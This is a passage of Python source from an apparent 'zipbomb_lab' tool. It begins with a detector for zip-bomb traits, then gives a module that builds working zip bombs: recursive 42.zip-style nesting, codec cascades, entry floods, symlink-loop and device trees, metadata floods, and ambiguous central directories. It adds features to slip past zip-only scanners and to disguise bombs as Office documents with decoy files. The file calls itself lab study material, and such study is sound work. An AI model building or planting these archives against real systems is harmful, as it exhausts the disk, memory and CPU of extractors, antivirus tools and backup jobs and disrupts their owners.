                    f"threshold {format_ratio(max_ratio)}"
                )
            if info.file_size > max_total:
                flags.append(
                    f"declared size {format_size(info.file_size)} is above the "
                    f"per-entry threshold {format_size(max_total)}"
                )

            nested_depth = 0
            nested_total = 0
            nested_fanout = 0
            entry_probed = 0
            if deep and probe_budget > 0 and (info.compress_size or info.file_size):
                probe = (info.compress_size >= MIN_PROBE_COMPRESSED) or (
                    info.file_size >= MIN_RATIO_ENTRY_BYTES
                )
                want = int(min(info.file_size, probe_bytes, probe_budget))
                if probe and want > 0:
                    try:
                        with archive.open(info) as handle:
                            blob = handle.read(want)
                    except (zipfile.BadZipFile, OSError, ValueError, RuntimeError) as exc:
                        notes.append(f"could not probe {info.filename!r}: {exc}")
                        blob = b""
                    entry_probed = len(blob)
                    probed_total += entry_probed
                    probe_budget -= entry_probed
                    containers = [c for c in craft.sniff_containers(blob) if c != "zip"]
                    if containers:
                        stacked = True
                        flags.append(
                            f"payload begins with a {'/'.join(containers)} stream, not a "
                            f"zip - zip-only scanners will not follow it"
                        )
                    nested_depth, nested_total, nested_fanout, nested_probed = _scan_nested(
                        blob, 1, int(max_depth), probe_budget, notes
                    )
                    probed_total += nested_probed
                    probe_budget -= nested_probed
                    if nested_depth:
                        flags.append(
                            f"contains a nested zip archive "
                            f"(depth {nested_depth}, fanout {nested_fanout}, declares "
                            f"{format_size(nested_total)})"
                        )
                        projected = nested_total * max(nested_fanout, 1) ** nested_depth
                        notes.append(
                            f"if the nesting continues to the bottom of the "
                            f"{nested_depth}-deep chain, the recursive expansion is "
                            f"on the order of {format_size(projected)}"
                        )
                    if nested_depth and info.compress_size >= 0.9 * archive_bytes:
                        flags.append(
                            "its compressed payload is nearly the whole archive - "
                            "the recursive-bomb signature"
                        )

            if flags:
                findings.append(
                    EntryFinding(
                        name=info.filename,
                        file_size=info.file_size,
                        compress_size=info.compress_size,
                        ratio=ratio,
                        method=info.compress_type,
                        flags=flags,
                        nested_depth=nested_depth,
                        nested_total=nested_total,
                        nested_fanout=nested_fanout,
                        probed_bytes=entry_probed,
                    )
                )

    reasons: list[str] = []
    if total_uncompressed > max_total:
        reasons.append(
            f"declared contents of {format_size(total_uncompressed)} exceed the "
            f"archive threshold of {format_size(max_total)}"
        )
    if len(infos) > max_entries:
        reasons.append(
            f"{len(infos):,} entries exceed the entry threshold of {max_entries:,}"
        )
    if findings:
        reasons.append(f"{len(findings):,} flagged entries")

    # Replicated payloads: a signature of a nested recipe, where one level holds
    # fanout identical copies of the same inner archive. Small duplicates are
    # common in the wild, so only sizeable identical entries are reported.
    replica_counts: dict[tuple[int, int, int], int] = {}
    for info in infos:
        if info.file_size < REPLICATE_MIN_BYTES:
            continue
        key = (info.file_size, info.compress_size, info.CRC)
        replica_counts[key] = replica_counts.get(key, 0) + 1
    replicas = max(replica_counts.values(), default=0)
    replica_size = 0
    for (file_size, _compressed, _crc), count in replica_counts.items():
        if count == replicas and count >= REPLICATE_MIN_COUNT:
            replica_size = file_size
            break
    if replicas >= REPLICATE_MIN_COUNT:
        reasons.append(
            f"{replicas:,} byte-identical entries of {format_size(replica_size)} "
            f"each - the replicated nested-bomb signature"
        )

    # Raw-index checks: polyglot preambles and the ambiguity tricks that make a
    # reader and an extractor see different archives. Bounded by RAW_READ_LIMIT.
    raw = b""
    try:
        if archive_bytes <= RAW_READ_LIMIT:
            raw = path.read_bytes()
        else:
            notes.append(
                f"{format_size(archive_bytes)} is above the raw-index read limit, "
                f"so polyglot and ambiguity checks were skipped"
            )
    except OSError:
        raw = b""
    polyglot = craft.looks_like_polyglot(raw) if raw else None
    mismatches: list[tuple[str, int, int]] = []
    overlaps: list[tuple[int, list[str]]] = []
    if raw:
        base = craft.strip_preamble(raw)
        try:
            overlaps = craft.duplicate_offsets(base)
            mismatches = craft.local_central_mismatches(base)
        except craft.CraftError:
            overlaps, mismatches = [], []
    if special_count:
        reasons.append(
            f"{special_count} entries carry special Unix metadata "
            f"(symlinks/FIFOs/devices)"
        )
    if polyglot:
        reasons.append(
            f"polyglot: the file is not a zip at offset zero ({polyglot} preamble) "
            f"but carries zip data readers will find from the end"
        )
    if mismatches:
        reasons.append(
            f"{len(mismatches)} entries disagree between the local header and the "
            f"central directory - an ambiguous index"
        )
    if overlaps:
        reasons.append(
            f"{len(overlaps)} local payload(s) are referenced by more than one "
            f"entry - overlapping entries"
        )
    if long_names >= LONG_NAME_MIN_COUNT:
        reasons.append(
            f"{long_names} entries have names over {LONG_NAME_BYTES} bytes - a "
            f"metadata flood that costs parsers on open"
        )

    families: list[str] = []

    def remember(name: str) -> None:
        if name not in families:
            families.append(name)

    if any(_is_zip_slip(info.filename) for info in infos):
        remember("zip-slip")
    if any(finding.nested_depth for finding in findings) or replicas >= REPLICATE_MIN_COUNT:
        remember("layered")
    if special_count:
        remember("traversal")
    if polyglot:
        remember("polyglot")
    if mismatches or overlaps:
        remember("ambiguous")
    if stacked:
        remember("codec")
    if max_ratio_seen and max_ratio_seen > max_ratio:
        remember("flat")
    if len(infos) > max_entries:
        remember("wide")
    if long_names >= LONG_NAME_MIN_COUNT:
        remember("parse")

    return ScanReport(
        path=str(path),
        entry_count=len(infos),
        total_uncompressed=total_uncompressed,
        total_compressed=total_compressed,
        max_ratio=max_ratio_seen,
        max_ratio_entry=max_ratio_entry,
        zip64=zip64,
        findings=findings,
        reasons=reasons,
        notes=notes,
        families=families,
        probed_bytes=probed_total,
    )


# -- recipes --
"""Structural bomb recipes: the *shape* of an archive, not just its codec.

``methods.py`` answers "which compressor writes the bytes". This module answers
"how are the bytes arranged", which is the other half of the zip bomb
literature. The classic families are:

``flat``
    One (or a few split) very compressible streams - the non-recursive bomb
    (``zbsm.zip`` class). This is what ``make.create_archive`` already builds,
    so the recipe simply delegates to it.

``layered``
    A recursively nested bomb: an archive whose entries each hold another
    archive, ``layers`` deep, with ``fanout`` copies per level. This is the
    ``42.zip`` / ``zblg.zip`` family. Declared (recursive) size grows as
    ``fanout ** layers * leaf_bytes`` while the file on disk stays small,
    because every wrapper stores already-compressed inner archives.

``cascade``
    Like ``layered`` but each wrapping level uses a *different* codec
    (deflate, bzip2, lzma, stored, ...). It shows the honest result of
    chaining codecs: the second and later passes barely help, because the
    inner payload is already compressed.

``wide``
    One level with very many entries (an "entry count" bomb). Expansion is
    linear in the entry count, and it stresses scanners that only look at
    per-entry ratios.

``traversal``
    A tree that never ends for a recursive walker: symlinks that loop back to
    ``.``/``..``, FIFO and device entries. Uses Unix mode metadata via
    :mod:`zipbomb_lab.engine`'s craft section. It bites on *extraction* (mode-honouring tools)
    or on any later recursive walk (``cp -r``, ``find -L``, backups, AV).

``onopen``
    A metadata flood: a long-named central directory that costs a parser real
    memory on *open*, before anything is extracted.

``stack``
    A zip member that is a gzip/xz/bzip2 chain rather than another zip, so
    zip-only scanners never follow it.

``overlap``
    A deliberately ambiguous index: the central directory disagrees with the
    local headers and two entries share one payload, so a reader and an
    extractor can see different archives ("zip confusion").

Any recipe can also take a **polyglot preamble** (``--preamble pdf|html|gif``)
so the file is also recognisable as another type to magic-based sniffers.

Every number in a :class:`BombPlan` is measured by assembling the archive in
memory (bounded by :data:`MAX_ASSEMBLE_BYTES`) unless the plan says otherwise;
``wide`` and very large special-family targets are modelled analytically. A
true self-replicating *quine* is out of scope: it needs a hand-solved fixed
point over the whole file and is not produced here.

This module is study material for isolated lab machines. Built artifacts are
dangerous to extract; the docstrings and the safety banner say so, and
``policy`` gates the real write.
"""


import bz2
import gzip
import io
import lzma
import time
import zipfile
from dataclasses import dataclass, field
from pathlib import Path

from .core import ZIP64_LIMIT, format_ratio, normalize_level
from .core import MIB, format_duration, format_size
from .ui import Progress, UX

__all__ = [
    "NAME_STYLES",
    "MIN_LEAF_BYTES",
    "MAX_MEASURE_LEAF_BYTES",
    "MAX_ASSEMBLE_BYTES",
    "MAX_LAYERS",
    "MAX_FANOUT",
    "DEFAULT_FANOUT",
    "CASCADE_CYCLE",
    "STACK_CYCLE",
    "ONOPEN_NAME_LENGTH",
    "Recipe",
    "RECIPES",
    "get_recipe",
    "BombPlan",
    "plan",
    "build_bomb",
    "describe_recipes",
]

#: Smallest leaf payload worth nesting; keeps header overhead from dominating.
MIN_LEAF_BYTES = 1024

#: Largest leaf the planner will actually assemble to measure a plan. Bigger
#: leaves belong in a ``flat`` archive instead.
MAX_MEASURE_LEAF_BYTES = 32 * MIB

#: Hard ceiling on an assembled archive held in memory.
MAX_ASSEMBLE_BYTES = 512 * MIB

#: Structure limits. ``MAX_FANOUT`` matches the widest sensible recursion.
MAX_LAYERS = 32
MAX_FANOUT = 4096

#: The canonical ``42.zip`` fanout.
DEFAULT_FANOUT = 16

#: Zero buffer used while writing leaves (RAM stays flat regardless of size).
ZERO_CHUNK = 4 * MIB
_ZEROS = b"\0" * ZERO_CHUNK

#: Codec order used by the ``cascade`` recipe when wrapping inner archives.
CASCADE_CYCLE = ("deflate", "bzip2", "lzma", "stored")

#: Non-zip containers used by the ``stack`` recipe (in order, outermost last).
STACK_CYCLE = ("gzip", "xz", "bzip2")

#: Fixed name padding for the on-open metadata flood.
ONOPEN_NAME_LENGTH = 200

#: Largest target the special families will assemble just to measure sizes;
#: above this the planner falls back to an analytic model.
MAX_MEASURE_TARGET = 64 * MIB

#: Default nesting depth for the traversal loop path.
DEFAULT_TRAVERSAL_DEPTH = 8

#: Entry naming strategies.
NAME_STYLES = ("plain", "mimic")


@dataclass(frozen=True)
class Recipe:
    """One structural bomb family."""

    key: str
    label: str
    summary: str
    knobs: tuple[str, ...]
    default_fanout: int = DEFAULT_FANOUT
    default_entries: int = 1024

    @property
    def recursive(self) -> bool:
        return self.key in ("layered", "cascade")


RECIPES: dict[str, Recipe] = {
    recipe.key: recipe
    for recipe in (
        Recipe(
            "flat",
            "flat (non-recursive)",
            "a single stream of zeros - the baseline that scanners catch first",
            ("split",),
        ),
        Recipe(
            "layered",
            "layered (42.zip class)",
            "recursive nesting: fanout copies per level, layers deep",
            ("layers", "fanout", "names"),
        ),
        Recipe(
            "cascade",
            "cascade (codec chain)",
            "recursive nesting with a different codec at every level",
            ("layers", "fanout", "names"),
        ),
        Recipe(
            "wide",
            "wide (entry count)",
            "one level holding a large number of compressible entries",
            ("entries", "names"),
        ),
        Recipe(
            "traversal",
            "traversal (symlink loop)",
            "a tree that never ends for recursive walkers: symlink loops, FIFOs, devices",
            ("layers", "fanout", "names"),
        ),
        Recipe(
            "onopen",
            "on-open metadata flood",
            "a huge, long-named central directory that bites parse-only tools",
            ("entries",),
        ),
        Recipe(
            "stack",
            "stack (non-zip codecs)",
            "a codec chain wrapped in gzip/xz/bzip2 to evade zip-only scanners",
            ("layers",),
        ),
        Recipe(
            "overlap",
            "overlap (ambiguous index)",
            "local header and central directory disagree, so reader and extractor differ",
            (),
        ),
    )
}


def get_recipe(key: str) -> Recipe:
    """Look a recipe up by name, raising a friendly error when unknown."""
    try:
        return RECIPES[key.lower()]
    except (KeyError, AttributeError):
        known = ", ".join(sorted(RECIPES))
        raise ValueError(f"unknown recipe {key!r} - choose one of: {known}") from None


def describe_recipes() -> list[Recipe]:
    """Recipes in registry order, for menus and tables."""
    return list(RECIPES.values())


# -- entry naming ----------------------------------------------------------

_MIMIC_DIRS = ("assets/js", "assets/css", "media/img", "vendor/lib", "modules/core")
_MIMIC_STEMS = ("bundle", "runtime", "polyfill", "index", "chunk", "vendor", "main")
_MIMIC_EXTS = (".js", ".css", ".png", ".woff2", ".map")

#: Small, plausible outer files added only in ``mimic`` style so a recursive
#: bomb can masquerade as an ordinary document/package.
_MIMIC_DECOYS: tuple[tuple[str, bytes], ...] = (
    (
        "[Content_Types].xml",
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        b'<Default Extension="xml" ContentType="application/xml"/></Types>',
    ),
    (
        "_rels/.rels",
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Type="officeDocument"/></Relationships>',
    ),
    (
        "docProps/core.xml",
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b"<cp:coreProperties><dc:title>report</dc:title></cp:coreProperties>",
    ),
)


def _leaf_name(name_style: str) -> str:
    if name_style == "mimic":
        return "word/document.xml"
    return "zeros.bin"


def _mimic_name(layer: int, index: int) -> str:
    directory = _MIMIC_DIRS[layer % len(_MIMIC_DIRS)]
    stem = _MIMIC_STEMS[index % len(_MIMIC_STEMS)]
    extension = _MIMIC_EXTS[(layer + index) % len(_MIMIC_EXTS)]
    return f"{directory}/{stem}{index:03d}{extension}"


def _wrapper_names(count: int, name_style: str, layer: int) -> list[str]:
    """Distinct names for one wrapping level."""
    if name_style == "mimic":
        return [_mimic_name(layer, index) for index in range(count)]
    return [f"layer{layer:02d}/part{index:03d}.bin" for index in range(count)]


def _schedule(recipe: Recipe, method: str, layers: int) -> tuple[str, ...]:
    """Codec used at each wrapping level (outermost last)."""
    if recipe.key == "cascade":
        return tuple(CASCADE_CYCLE[index % len(CASCADE_CYCLE)] for index in range(layers))
    return (method,) * layers


# -- assembly --------------------------------------------------------------


def _compresslevel(method: str, level: int) -> int | None:
    return level if method in ("deflate", "bzip2") else None


def _leaf_archive(
    leaf_bytes: int,
    method: str,
    level: int,
    name: str,
    chunk: int = ZERO_CHUNK,
    tick=None,
) -> bytes:
    """Build the innermost archive: one entry of ``leaf_bytes`` zeros."""
    method_def = methods.get_method(method)
    level = normalize_level(method, level)
    buffer = io.BytesIO()
    with methods.lzma_preset(level):
        with zipfile.ZipFile(
            buffer,
            "w",
            compression=method_def.zip_constant,
            compresslevel=_compresslevel(method, level),
            allowZip64=True,
        ) as archive:
            with archive.open(name, "w") as handle:
                remaining = int(leaf_bytes)
                while remaining > 0:
                    size = min(ZERO_CHUNK, remaining)
                    handle.write(_ZEROS[:size])
                    remaining -= size
                    if tick is not None:
                        tick(size)
    return buffer.getvalue()


def _wrap(
    inner: bytes,
    fanout: int,
    method: str,
    level: int,
    names: list[str],
    decoys: tuple[tuple[str, bytes], ...] = (),
    tick=None,
) -> bytes:
    """Compress ``fanout`` copies of *inner* (plus optional decoys) into a zip."""
    method_def = methods.get_method(method)
    level = normalize_level(method, level)
    buffer = io.BytesIO()
    with methods.lzma_preset(level):
        with zipfile.ZipFile(
            buffer,
            "w",
            compression=method_def.zip_constant,
            compresslevel=_compresslevel(method, level),
            allowZip64=True,
        ) as archive:
            for name in names:
                archive.writestr(name, inner)
                if tick is not None:
                    tick(len(inner))
            for name, data in decoys:
                archive.writestr(name, data)
    return buffer.getvalue()


def _assemble_layered(
    leaf_bytes: int,
    layers: int,
    fanout: int,
    recipe: Recipe,
    method: str,
    level: int,
    name_style: str,
    tick=None,
) -> tuple[bytes, list[int]]:
    """Assemble the nested bomb bottom-up, returning its bytes and layer sizes."""
    schedule = _schedule(recipe, method, layers)
    current = _leaf_archive(leaf_bytes, method, level, _leaf_name(name_style), tick=tick)
    sizes = [len(current)]
    for layer in range(layers):
        level_for_layer = normalize_level(schedule[layer], level if schedule[layer] == method else None)
        decoys = _MIMIC_DECOYS if (name_style == "mimic" and layer == layers - 1) else ()
        current = _wrap(
            current,
            fanout,
            schedule[layer],
            level_for_layer,
            _wrapper_names(fanout, name_style, layer),
            decoys,
            tick=tick,
        )
        sizes.append(len(current))
        if len(current) > MAX_ASSEMBLE_BYTES:
            raise ValueError(
                f"assembling this plan needs {format_size(len(current))} in memory, "
                f"above the {format_size(MAX_ASSEMBLE_BYTES)} assembly ceiling - "
                f"raise --layers or lower --fanout"
            )
    return current, sizes


# -- planning --------------------------------------------------------------


@dataclass
class BombPlan:
    """A measurable description of one structural bomb."""

    recipe: str
    method: str
    level: int
    layers: int
    fanout: int
    leaf_bytes: int
    name_style: str
    expanded_bytes: int
    declared_bytes: int
    archive_bytes: int
    ratio: float
    outer_entries: int
    total_entries: int
    zip64: bool
    seconds: float
    processed_bytes: int
    measured: bool = True
    trigger: str = "extraction"
    name_length: int = 0
    preamble: str = "none"
    layer_sizes: tuple[int, ...] = ()
    method_schedule: tuple[str, ...] = ()
    warnings: list[str] = field(default_factory=list)

    @property
    def label(self) -> str:
        recipe = RECIPES.get(self.recipe)
        return recipe.label if recipe else self.recipe

    def as_estimate(self) -> methods.Estimate:
        """Reuse the flat estimator's shape so policy and printers apply."""
        return methods.Estimate(
            target_bytes=self.expanded_bytes,
            method=self.method,
            level=self.level,
            ratio=self.ratio,
            output_bytes=self.archive_bytes,
            seconds=self.seconds,
            entries=self.outer_entries,
            split_bytes=None,
            zip64_required=self.zip64,
            encoder_memory=methods.approx_encoder_memory(self.method, self.level),
            warnings=tuple(self.warnings),
        )

    def summary_lines(self) -> list[str]:
        shape = (
            f"{self.layers} x fanout {self.fanout}"
            if self.recipe != "wide"
            else f"one level of {self.fanout:,} entries"
        )
        lines = [
            f"recipe             {self.recipe}",
            f"trigger class      {self.trigger}",
            f"codec schedule     {' -> '.join(self.method_schedule) or self.method}",
            f"shape              {shape}",
            f"leaf payload       {format_size(self.leaf_bytes)}",
            f"fully expanded     {format_size(self.expanded_bytes)} (recursively)",
            f"outer declares     {format_size(self.declared_bytes)}",
            f"projected archive  {format_size(self.archive_bytes)}",
            f"expansion ratio    {format_ratio(self.ratio)}",
            f"entries written    {self.outer_entries:,} outer / {self.total_entries:,} total",
        ]
        if self.name_length:
            lines.append(f"name length        {self.name_length:,} bytes per entry")
        if self.preamble != "none":
            lines.append(f"polyglot preamble  {self.preamble}")
        return lines

    def as_dict(self) -> dict:
        return {
            "recipe": self.recipe,
            "method": self.method,
            "level": self.level,
            "layers": self.layers,
            "fanout": self.fanout,
            "leaf_bytes": self.leaf_bytes,
            "leaf_human": format_size(self.leaf_bytes),
            "name_style": self.name_style,
            "expanded_bytes": self.expanded_bytes,
            "expanded_human": format_size(self.expanded_bytes),
            "declared_bytes": self.declared_bytes,
            "archive_bytes": self.archive_bytes,
            "archive_human": format_size(self.archive_bytes),
            "ratio": round(self.ratio, 3),
            "ratio_human": format_ratio(self.ratio),
            "outer_entries": self.outer_entries,
            "total_entries": self.total_entries,
            "zip64_required": self.zip64,
            "seconds": round(self.seconds, 2),
            "duration_human": format_duration(self.seconds),
            "processed_bytes": self.processed_bytes,
            "measured": self.measured,
            "trigger": self.trigger,
            "name_length": self.name_length,
            "preamble": self.preamble,
            "layer_sizes": list(self.layer_sizes),
            "method_schedule": list(self.method_schedule),
            "warnings": list(self.warnings),
        }


def _auto_layers(target_bytes: int, fanout: int) -> int:
    """Pick the shallowest nesting whose leaf still fits the measurement cap.

    For a fixed declared expansion a larger leaf and fewer wrappers always
    yields a smaller archive (each wrapper adds ``fanout`` copies), so the
    shallowest feasible depth is the strongest bomb.
    """
    layers = 1
    while layers < MAX_LAYERS and -(-target_bytes // fanout**layers) > MAX_MEASURE_LEAF_BYTES:
        layers += 1
    return layers


def plan(
    recipe_key: str,
    target_bytes: int,
    method: str = "bzip2",
    level: int | None = None,
    layers: int | None = None,
    fanout: int | None = None,
    entries: int | None = None,
    name_style: str = "plain",
    preamble: str = "none",
) -> BombPlan:
    """Model one structural bomb, measuring it in memory when affordable.

    ``target_bytes`` is the *recursively expanded* size - the number a scanner
    or an extractor would have to write to disk. The archive itself stays small
    for every nested family.
    """
    recipe = get_recipe(recipe_key)
    method = (method or "bzip2").lower()
    level = normalize_level(method, level)
    target_bytes = int(target_bytes)
    if target_bytes <= 0:
        raise ValueError("target size must be greater than zero")
    if name_style not in NAME_STYLES:
        raise ValueError(f"unknown name style {name_style!r} - choose from {', '.join(NAME_STYLES)}")
    if preamble not in craft.PREAMBLES:
        raise ValueError(
            f"unknown preamble {preamble!r} - choose from {', '.join(craft.PREAMBLES)}"
        )

    if recipe.key == "flat":
        est = methods.estimate(target_bytes, method, level)
        return BombPlan(
            recipe="flat",
            method=method,
            level=level,
            layers=1,
            fanout=1,
            leaf_bytes=target_bytes,
            name_style=name_style,
            expanded_bytes=target_bytes,
            declared_bytes=target_bytes,
            archive_bytes=est.output_bytes,
            ratio=est.ratio,
            outer_entries=est.entries,
            total_entries=est.entries,
            zip64=est.zip64_required,
            seconds=est.seconds,
            processed_bytes=target_bytes,
            measured=False,
            trigger="exhaustion",
            preamble=preamble,
            method_schedule=(method,),
            warnings=list(est.warnings),
        )

    warnings: list[str] = []
    calibration = methods.calibrate(method, level)

    if recipe.key == "wide":
        count = int(recipe.default_entries if entries is None else entries)
        if count < 1:
            raise ValueError("entry count must be at least 1")
        if count > 65534:
            raise ValueError("entry count above 65,534 requires a different tool (ZIP64 index)")
        leaf = max(1, target_bytes // count)
        expanded = leaf * count
        if expanded != target_bytes:
            warnings.append(
                f"rounded the leaf to {format_size(leaf)} so {count:,} entries "
                f"declare {format_size(expanded)}"
            )
        per_entry = max(1, int(leaf / max(calibration.ratio, 1e-9)))
        decoys = len(_MIMIC_DECOYS) if name_style == "mimic" else 0
        archive_bytes = (count + decoys) * (per_entry + 110) + 64
        seconds = target_bytes / max(calibration.bytes_per_second, 1.0)
        if seconds > 1800:
            warnings.append(
                f"writing {count:,} entries takes about {format_duration(seconds)} "
                f"at {calibration.mib_per_second:,.0f} MiB/s"
            )
        return BombPlan(
            recipe="wide",
            method=method,
            level=level,
            layers=1,
            fanout=count,
            leaf_bytes=leaf,
            name_style=name_style,
            expanded_bytes=expanded,
            declared_bytes=expanded,
            archive_bytes=archive_bytes,
            ratio=expanded / max(archive_bytes, 1),
            outer_entries=count + decoys,
            total_entries=count,
            zip64=expanded > ZIP64_LIMIT or archive_bytes > ZIP64_LIMIT,
            seconds=seconds,
            processed_bytes=target_bytes,
            measured=False,
            trigger="exhaustion",
            preamble=preamble,
            method_schedule=(method,),
            warnings=warnings,
        )

    if recipe.key in ("traversal", "onopen", "stack", "overlap"):
        return _plan_special(
            recipe, target_bytes, method, level, layers, fanout, entries, name_style, preamble
        )

    # layered / cascade
    fanout = int(recipe.default_fanout if fanout is None else fanout)
    if not 1 <= fanout <= MAX_FANOUT:
        raise ValueError(f"fanout must be between 1 and {MAX_FANOUT}, got {fanout}")

    if layers is None:
        layers = _auto_layers(target_bytes, fanout)
    layers = int(layers)
    if not 1 <= layers <= MAX_LAYERS:
        raise ValueError(f"layers must be between 1 and {MAX_LAYERS}, got {layers}")

    leaf = -(-target_bytes // (fanout**layers))
    if leaf < MIN_LEAF_BYTES:
        leaf = MIN_LEAF_BYTES
        warnings.append(
            f"leaf raised to {format_size(leaf)} so headers stay negligible; "
            f"the bomb declares {format_size(leaf * fanout**layers)}"
        )
    if leaf > MAX_MEASURE_LEAF_BYTES:
        raise ValueError(
            f"a {format_size(target_bytes)} target at {layers} layer(s) needs a "
            f"{format_size(leaf)} leaf, above the {format_size(MAX_MEASURE_LEAF_BYTES)} "
            f"planning limit - add --layers/--fanout, or use --recipe flat"
        )

    expanded = leaf * fanout**layers
    if expanded != target_bytes:
        warnings.append(
            f"nesting {layers} layers of {fanout} gives {format_size(expanded)}, "
            f"the nearest reachable size at or below the target"
        )

    started = time.perf_counter()
    outer, sizes = _assemble_layered(
        leaf, layers, fanout, recipe, method, level, name_style
    )
    measured_seconds = time.perf_counter() - started

    # The outer archive's declared size is fanout copies of the layer beneath.
    declared = fanout * sizes[-2] if len(sizes) >= 2 else sizes[-1]
    archive_bytes = len(outer)
    seconds = leaf / max(calibration.bytes_per_second, 1.0)
    # The wrapper copies cost a little extra; the measured assembly time is a
    # better wall-clock signal than the model alone.
    seconds = max(seconds, measured_seconds)

    total_entries = fanout**layers
    zip64 = expanded > ZIP64_LIMIT or archive_bytes > ZIP64_LIMIT
    if archive_bytes > ZIP64_LIMIT:
        warnings.append("the outer archive itself exceeds 4 GiB, so ZIP64 is required")
    if method == "lzma" and level > 6:
        warnings.append(
            "higher LZMA presets cost memory and time on nested data without "
            "improving the ratio (the dictionary is not the limit)"
        )
    if len(set(_schedule(recipe, method, layers))) > 1:
        warnings.append(
            "cascade re-compresses already-compressed data, so the extra "
            "codecs add almost nothing beyond the first pass"
        )

    processed = leaf + sum(fanout * size for size in sizes[:-1])
    return BombPlan(
        recipe=recipe.key,
        method=method,
        level=level,
        layers=layers,
        fanout=fanout,
        leaf_bytes=leaf,
        name_style=name_style,
        expanded_bytes=expanded,
        declared_bytes=declared,
        archive_bytes=archive_bytes,
        ratio=expanded / max(archive_bytes, 1),
        outer_entries=fanout + (len(_MIMIC_DECOYS) if name_style == "mimic" else 0),
        total_entries=total_entries,
        zip64=zip64,
        seconds=seconds,
        processed_bytes=processed,
        measured=True,
        trigger="exhaustion",
        preamble=preamble,
        layer_sizes=tuple(sizes),
        method_schedule=_schedule(recipe, method, layers),
        warnings=warnings,
    )


# -- special families: traversal / on-open / stack / overlap --------------.


def _write_zeros(handle, total: int, tick=None) -> None:
    """Stream *total* zero bytes into an open zip entry handle."""
    remaining = int(total)
    while remaining > 0:
        size = min(ZERO_CHUNK, remaining)
        handle.write(_ZEROS[:size])
        remaining -= size
        if tick is not None:
            tick(size)


def _compress_container(codec: str, blob: bytes) -> bytes:
    """Wrap *blob* with a non-zip container codec."""
    if codec == "gzip":
        return gzip.compress(blob, 9)
    if codec == "xz":
        return lzma.compress(blob, format=lzma.FORMAT_XZ, preset=6)
    if codec == "bzip2":
        return bz2.compress(blob, 9)
    raise ValueError(f"unknown container codec {codec!r}")


def _measure(builder, plan) -> int:
    """Build *plan* into memory and return its byte size."""
    buffer = io.BytesIO()
    builder(buffer, plan)
    return len(buffer.getvalue())


def _measure_or_model(builder, plan, target_bytes: int, ratio: float, warnings: list[str],
                      analytic) -> int:
    """Measure by building when affordable, otherwise use *analytic*."""
    if target_bytes <= MAX_MEASURE_TARGET:
        plan.measured = True
        return _measure(builder, plan)
    plan.measured = False
    warnings.append(
        f"target above the {format_size(MAX_MEASURE_TARGET)} measurement limit; "
        f"the archive size is modelled, not assembled"
    )
    return analytic(plan, ratio)


def _model_entries(plan, ratio: float) -> int:
    """Model an archive that is mostly header and name bytes."""
    per_entry = max(1, int(plan.leaf_bytes / max(ratio, 1e-9)))
    name_cost = max(plan.name_length, 24) + 24
    return plan.outer_entries * (per_entry + 100 + name_cost) + 512


def _model_stack(plan, ratio: float) -> int:
    """Model the outer zip of a codec chain: roughly the leaf plus a frame."""
    leaf_archive = max(1, int(plan.leaf_bytes / max(ratio, 1e-9))) + 128
    return leaf_archive + 256


def _build_traversal(target, plan, tick=None) -> None:
    """Write a tree that is infinite to any recursive walker."""
    method_def = methods.get_method(plan.method)
    level = normalize_level(plan.method, plan.level)
    depth = max(1, min(int(plan.layers), 64))
    fanout = max(1, int(plan.fanout))
    prefix = "loop/" * depth
    with methods.lzma_preset(level):
        with zipfile.ZipFile(
            target,
            "w",
            compression=method_def.zip_constant,
            compresslevel=_compresslevel(plan.method, level),
            allowZip64=True,
        ) as archive:
            archive.writestr(craft.special_info("loop", craft.S_IFLNK | 0o777), b".")
            archive.writestr(craft.special_info("up", craft.S_IFLNK | 0o777), b"..")
            archive.writestr(craft.special_info("root", craft.S_IFLNK | 0o777), b"/")
            archive.writestr(craft.special_info("fifo", craft.S_IFIFO | 0o644), b"")
            archive.writestr(craft.special_info("null", craft.S_IFCHR | 0o666), b"")
            for index in range(fanout):
                if plan.name_style == "mimic":
                    leaf = _mimic_name(0, index)
                else:
                    leaf = f"payload{index:04d}.bin"
                with archive.open(f"{prefix}{leaf}", "w") as handle:
                    _write_zeros(handle, plan.leaf_bytes, tick)
            if plan.name_style == "mimic":
                for name, data in _MIMIC_DECOYS:
                    archive.writestr(name, data)


def _build_onopen(target, plan, tick=None) -> None:
    """Write a long-named central directory without extracting anything."""
    pad = "n" * max(1, min(int(plan.name_length or ONOPEN_NAME_LENGTH), 246))
    with zipfile.ZipFile(
        target, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=True
    ) as archive:
        for index in range(max(1, int(plan.fanout))):
            name = f"{index:04d}_{pad}.dat"
            with archive.open(name, "w") as handle:
                _write_zeros(handle, plan.leaf_bytes, tick)


def _build_stack(target, plan, tick=None) -> None:
    """Write a zip whose only member is a chain of non-zip codecs."""
    blob = _leaf_archive(plan.leaf_bytes, plan.method, plan.level, "zeros.bin", tick=tick)
    for index in range(max(1, int(plan.layers))):
        blob = _compress_container(STACK_CYCLE[index % len(STACK_CYCLE)], blob)
    with zipfile.ZipFile(
        target, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=True
    ) as archive:
        archive.writestr("payload.bin", blob)


def _craft_overlap(leaf_bytes: int) -> bytes:
    """Build a two-entry archive, then make its index ambiguous."""
    size = max(1, min(int(leaf_bytes), ZERO_CHUNK))
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=True) as archive:
        archive.writestr("data/part000.bin", _ZEROS[:size])
        archive.writestr("data/part001.bin", _ZEROS[:size])
    data = buffer.getvalue()
    entries = craft.central_entries(data)
    # Claim a ~4 GiB member that the data cannot deliver, and point the second
    # entry at the first entry's bytes: a trusting reader and an extractor now
    # see two different archives.
    data = craft.patch_central(data, entries[0].name, file_size=craft.ZIP64_LIMIT)
    data = craft.patch_central(data, entries[-1].name, header_offset=entries[0].header_offset)
    return data


def _plan_special(
    recipe: Recipe,
    target_bytes: int,
    method: str,
    level: int,
    layers: int | None,
    fanout: int | None,
    entries: int | None,
    name_style: str,
    preamble: str,
) -> BombPlan:
    """Plans for the families that are not about raw expansion."""
    calibration = methods.calibrate(method, level)
    throughput = max(calibration.bytes_per_second, 1.0)
    warnings: list[str] = []

    if recipe.key == "traversal":
        count = int(recipe.default_fanout if fanout is None else fanout)
        if count < 1:
            raise ValueError("fanout must be at least 1")
